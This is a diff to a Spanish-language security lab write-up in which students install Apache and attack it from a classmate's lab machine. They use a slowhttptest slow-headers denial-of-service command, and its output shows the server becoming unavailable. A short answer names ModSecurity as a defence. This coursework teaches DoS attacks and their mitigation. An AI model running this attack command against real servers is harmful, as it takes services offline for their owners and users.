@@ -1589,6 +1589,8 @@ PARA PLANTEAR DE FORMA TEÓRICA:
 
 Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).
 
+Instalamos servidor apache:
+
 ```bash
 root@debian:/home/lsi# apt install apache2
 ...
@@ -1598,15 +1600,124 @@ root@debian:/home/lsi# curl https://www.alvarofreire.es/ > /var/www/html/index.h
 100  9341  100  9341    0     0  56612      0 --:--:-- --:--:-- --:--:-- 56957
 ```
 
-```bash
+Desde la máquina del compañero realizamos el ataque:
 
+```bash
+root@debian:/home/lsi# slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.106 -x 24 -p 3
+Thu Nov  3 23:57:36 2022:
+Thu Nov  3 23:57:36 2022:
+	slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://10.11.49.106/
+verb:                             GET
+cookie:                           
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          200
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy 
+
+Thu Nov  3 23:57:36 2022:
+slow HTTP test status on 0th second:
+
+initializing:        0
+pending:             1
+connected:           0
+error:               0
+closed:              0
+service available:   YES
+Thu Nov  3 23:57:41 2022:
+Thu Nov  3 23:57:41 2022:
+	slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://10.11.49.106/
+verb:                             GET
+cookie:                           
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          200
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy 
+
+Thu Nov  3 23:57:41 2022:
+slow HTTP test status on 5th second:
+
+initializing:        0
+pending:             366
+connected:           550
+error:               0
+closed:              0
+service available:   YES
+Thu Nov  3 23:57:47 2022:
+Thu Nov  3 23:57:47 2022:
+	slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://10.11.49.106/
+verb:                             GET
+cookie:                           
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          200
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy 
+
+Thu Nov  3 23:57:47 2022:
+slow HTTP test status on 10th second:
+
+initializing:        0
+pending:             313
+connected:           687
+error:               0
+closed:              0
+service available:   NO
+Thu Nov  3 23:57:52 2022:
+Thu Nov  3 23:57:52 2022:
+	slowhttptest version 1.8.2
+ - https://github.com/shekyan/slowhttptest -
+test type:                        SLOW HEADERS
+number of connections:            1000
+URL:                              http://10.11.49.106/
+verb:                             GET
+cookie:                           
+Content-Length header value:      4096
+follow up data max size:          52
+interval between follow up data:  10 seconds
+connections per seconds:          200
+probe connection timeout:         3 seconds
+test duration:                    240 seconds
+using proxy:                      no proxy
+
+Fri Nov  4 00:32:59 2022:
+slow HTTP test status on 240th second:
+
+initializing:        0
+pending:             0
+connected:           26
+error:               0
+closed:              974
+service available:   NO
+^CFri Nov  4 00:33:00 2022:
+Test ended on 240th second
+Exit status: Cancelled by user
+CSV report saved to slowhttp.csv
+HTML report saved to slowhttp.html
 ```
 
-archivo slowhttp.html:
-
-- ª
-
 ¿Cómo podría proteger dicho servicio ante este tipo de ataque?
+
+Con un firewall de aplicaciones web como modsecurity.
 
 ¿Y si se produjese desde fuera de su segmento de red?
 
